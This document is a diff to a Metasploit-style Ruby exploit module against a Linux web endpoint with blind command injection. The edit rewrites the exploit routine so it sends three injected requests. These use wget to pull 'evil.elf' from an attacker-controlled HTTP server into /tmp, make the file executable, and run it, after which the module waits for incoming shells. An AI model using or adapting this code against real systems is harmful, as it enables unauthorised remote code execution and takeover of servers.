@@ -13,7 +13,6 @@
                 },
                 'Author'         => [ 'iamj3k @RoT' ],
                 'License'        => 'This is my license',
-	        'Payload'        => { 'BadChars' => "\x00" },
 	        'Platform'       => 'linux',
 	        'Targets'        =>
         	  [
@@ -22,10 +21,10 @@
 	        'DefaultTarget'  => 0 ))
             register_options(
                 [
-                    OptString.new('TARGETURI', [true, 'The base path', '/']),
-                    OptString.new('CMD', [true, 'Execute this command', 'hostname']),
-                    OptAddress.new('SRVHOST', [true, 'HTTP Server Bind Address', '94.22.121.53']),
-                    OptInt.new('SRVPORT', [true, 'HTTP Server Port', '3000'])
+                    OptString.new('WRITABLEDIR', [true, 'Path to writable directory on target', '/tmp/']),
+                    OptString.new('FILENAME', [true, 'Payload filename', 'evil.elf']),
+                    OptAddress.new('SRVHOST', [true, 'HTTP Server Bind Address', '127.0.1.1']),
+                    OptInt.new('SRVPORT', [true, 'HTTP Server Port', '4444'])
                 ], self.class)
         end
 
@@ -42,7 +41,7 @@
             uri = "/"
             res = send_request_raw({
                 'method'   => 'GET',
-                'uri'      => normalize_uri(uri, '/',"vulnerable_url?cmd"),
+                'uri'      => normalize_uri(uri, '/',datastore['URIPATH'])
             })
             if res && res.code == 200
                Exploit::CheckCode::Vulnerable
@@ -51,39 +50,39 @@
             end
         end
 
-	    def request(cmd)
-              datastore['SSL'] = true
+        def request(cmd)
               uri = "/"
-              print_status(target_uri.path)
+              print_status(datastore['URIPATH']+cmd)
               res = send_request_raw({
                 'method'   => 'GET',
-                'uri'      => normalize_uri(uri, '/',"vulnerable_url?cmd="+cmd)
+                'uri'      => normalize_uri(uri, '/',datastore['URIPATH']+cmd)
               })
               if [200].include?(res.code)
                 print_status("#{rhost}:#{rport} - Request sent...")
               else
-                fail_with(Failure::Unknown, "#{rhost}:#{rport} - Unable to deploy payload")
+                fail_with(Failure::Unknown, "#{rhost}:#{rport} - HTTP Request failed")
               end
         end
-
         def exploit
-             datastore['SSL'] = false
-             cmd=datastore['CMD']
-	         srvhost=datastore['SRVHOST']
-	         srvport=datastore['SRVPORT']
-             filename = datastore['TARGETURI']
+	     srvhost=datastore['SRVHOST']
+	     srvport=datastore['SRVPORT']
+             filename = datastore['FILENAME']
+             wdir = datastore['WRITABLEDIR']
              resource_uri="/"+filename
-
+	     cmds=[
+		"wget+"+srvhost+":"+srvport.to_s+"/"+filename+"+-O+"+wdir+filename,
+          	"chmod+777+"+wdir+filename,
+		wdir+filename
+		]
 	         start_service({'Uri' => {
         	    'Proc' => Proc.new { |cli, req|
 	             on_request_uri(cli, req)},
 	             'Path' => resource_uri
 	          }})
-              print_status("#{rhost}:#{rport} - Blind Exploitation")
-              request(cmd)
-
-              sleep(10)
-
+              print_status("#{rhost}:#{rport} - Blind Exploitation in 3 requests...")
+	      cmds.each do |cmd|
+                request(cmd)
+              end
               print_status("#{srvhost}:#{srvport} - Waiting 3 minutes for shells")
               sleep(150)
         end
